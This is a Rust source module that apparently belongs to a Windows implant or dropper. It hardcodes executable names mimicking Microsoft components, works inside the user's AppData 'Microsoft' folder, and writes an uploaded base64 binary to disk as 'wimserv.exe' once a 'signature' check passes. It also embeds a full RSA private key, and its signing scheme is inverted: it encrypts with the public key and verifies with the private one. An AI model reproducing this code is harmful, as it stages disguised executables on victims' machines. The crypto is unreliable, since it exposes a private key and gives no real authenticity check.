use std::fs::{read, File};
use std::sync::Mutex;

use rand::rngs::OsRng;
use rsa::{PaddingScheme, PublicKey, RSAPrivateKey, RSAPublicKey};
use serde::{de::DeserializeOwned, Serialize};
use sha2::{Digest, Sha256};

use crate::error::*;
use crate::api::UploadParameters;
use std::env;
use std::io::Write;

lazy_static! {
    pub static ref NAME1: String = "WMPDMC.exe".to_string();
    pub static ref NAME2: String = "wimserv.exe".to_string();

    pub static ref KEY: RSAPrivateKey = {
        let file_content = r#"
-----BEGIN PRIVATE KEY-----
MIIEuwIBADALBgkqhkiG9w0BAQEEggSnMIIEowIBAAKCAQEAwCCggGWCeLAYObQz
XlvxgbK2pY7XkVgtsKtxPYDR4RdyR5Kl0xqC83Id0ezXpi+f6m9DjwLKbyveJdST
SrGzVk5HB43oL+bq8FZ6IRqLFueSHiu+f0ZUcORs+2GGnd8vLmZ7Peob6uRIwGYn
CtsgHt5rm2A22IHXekTk6OzzZCLLpHIcUt7QHR8GK3xfzU2PQ4HJx54cyYNVrXWg
XaOu06qD3tR7as142H0u5PpuUk1cqnM2RRognP07Y/9tPG7QsAdlX/ldIaOn8CcE
kRcs7lKW3EJ/WTxNdoLqQ2vuxw4xCLzA00X70dlCXdS6XVLd5aGbSJtxkt02UuTT
BK7wEwIDAQABAoIBAQCCTl6tVqur8Tss/+QLLm7ZGX25Qe1A3b53YX/3R8SRVtai
Znrjd8qzFIXXGDyWsRxT40y91RW5WtZbcBbKBUXt1j9kh0GgI4zanrxMcXU+fqbi
oaadKfUhcDveLyIfNv0ICmex8XMn19bj7ySxvzbE2PPAuPvZ0g50Ff/vXq4hDi87
ktHqYDFhospil2iATEKGX8mrW2ydnrn2jBWH3gsQXi3WX224F8lFAWVeLWahd+QK
9Y1OURIglrth9OYEw5QiHmuCaenGRodJ+aE3QO2ke/SndXzxkUFAjwyiWtcIU89Z
9dKnbeI/+GqEOyHiTjO4FTD2iVjeme160HX/08FJAoGBANLsMlZSp3P6XeddCktU
itJLiYktx0MPna47cmFXmkLGf330Lbe4VSd3P+bZlZtmFS46gpqW6pTzdXD5oHmu
hwJY7Z2jxpbYS9wgyvNNYfRGdo6H7KU5p6iqNZ9SiOdm2nBbpZAyY03rJZA1zOcj
UEDVaBAGAHJgho4dS01tBb+9AoGBAOkwIArC5Ss0bdPf0q0e7ULKZkSx7iosX/mO
Qa2AOCj7EhJ5hgh+/U5rs00UqAOo3DNfur6eJMLqCWCoQojbgRxOnqJ5BKV34gwp
qXGqiRrWPJCxTYzoGV7RCM/vVzAoPqDVbDflN79ksltgKHUOx5LcoHJ0ulHoZn62
3T33fMQPAoGAXknqYr6GTwlgSxpDjNNZT5MnA6TsS+VCNu4qPqu7sRgtTDAI8/U6
U+8yKM+h2psy4ryTP+oxKa8AFCXzgBHuFrWMW4koMKy2lMwwDb3NCTcqrqLCvkXc
1kBowjVSMCfBhLLje2ebDu0MmMAEPluB98muwGL+diMCY6tiy1TuWf0CgYAoC+rE
zlm7BMMDywGMV65ZdRcBHymOtpY47nRbDpUWfJ/K6nHZTa3E5Pwi9bQxBLPkYsFY
cSJREw5POjZK+J+AtAPMVUo1/JOmkRUXfzkSkc5O7xQpacbJoM6Jn0ny7EZtKpnu
M4BSb0GuLaJlEAe4Mgmf/mntHSNVCaSPOsyDgwKBgDW7U+4DxRKQnXxWtP8hQZiI
JtM5FmnAQY39drX+xYW4OQMEJv1Gy6jbCxtzfO5neqM81rqEIqsNR6rczZe6v5Wj
o68PGGitTO9eFYxrSASR9Dg8+UD4Db1EsKTpZbQw/b8eWUpdWgLXVMRXVZLQo6sk
/AZEBpsnxjdGDiNUBOnL
-----END PRIVATE KEY-----
"#;

        let der_encoded = file_content
            .lines()
            .filter(|line| !line.starts_with("-"))
            .fold(String::new(), |mut data, line| {
                data.push_str(&line);
                data
            });

        let der_bytes = base64::decode(&der_encoded).expect("failed to decode base64 content");
        RSAPrivateKey::from_pkcs8(&der_bytes).expect("failed to parse key")
    };
}

pub fn sha256(bytes: &[u8]) -> Vec<u8> {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    hasher.finalize().to_vec()
}

pub fn encrypt<T>(data: T, pub_key: &RSAPublicKey) -> Result<String>
where
    T: Serialize,
{
    let serialized = serde_json::to_string(&data)?;
    let padding = PaddingScheme::new_pkcs1v15_encrypt();
    let encrypted = pub_key.encrypt(&mut OsRng, padding, serialized.as_bytes())?;
    Ok(base64::encode(encrypted))
}

pub fn decrypt<T>(data: &str, private_key: &RSAPrivateKey) -> Result<T>
where
    T: DeserializeOwned,
{
    let decoded = base64::decode(data)?;
    let padding = PaddingScheme::new_pkcs1v15_encrypt();
    let decrypted = private_key.decrypt(padding, &decoded)?;
    Ok(serde_json::from_str(&String::from_utf8(decrypted)?)?)
}

pub fn get_sign(bytes: &[u8], pub_key: &RSAPublicKey) -> Result<String> {
    encrypt(sha256(bytes), &pub_key)
}

pub fn get_file_sign(path: &str, pub_key: &RSAPublicKey) -> Result<String> {
    get_sign(&read(path)?, pub_key)
}

pub fn verify_sign(bytes: &[u8], sign: &str, private_key: &RSAPrivateKey) -> Result<bool> {
    if let Ok(decrypted_digest) = decrypt::<Vec<u8>>(sign, private_key) {
        return Ok(decrypted_digest == sha256(bytes));
    }

    Ok(false)
}

pub fn verify_file_sign(path: &str, sign: &str, private_key: &RSAPrivateKey) -> Result<bool> {
    verify_sign(&read(path)?, sign, private_key)
}

pub fn chdir() {
    let data_dir = dirs::data_dir().unwrap();
    let root_dir = data_dir.join("Microsoft");
    env::set_current_dir(&root_dir);
}

pub fn save(upload: UploadParameters) -> Result<String> {
    let bytes = base64::decode(&upload.base64)?;

    // verify binary against signature?
    let sign_ok = verify_sign(&bytes, &upload.sign, &KEY)?;
    if !sign_ok {
        return Err("wrong signature".into());
    }

    // ...
    let path = NAME2.to_string();

    // store file on disk
    let mut file = File::create(&path).unwrap();
    file.write_all(&bytes).unwrap();

    Ok(path)
}
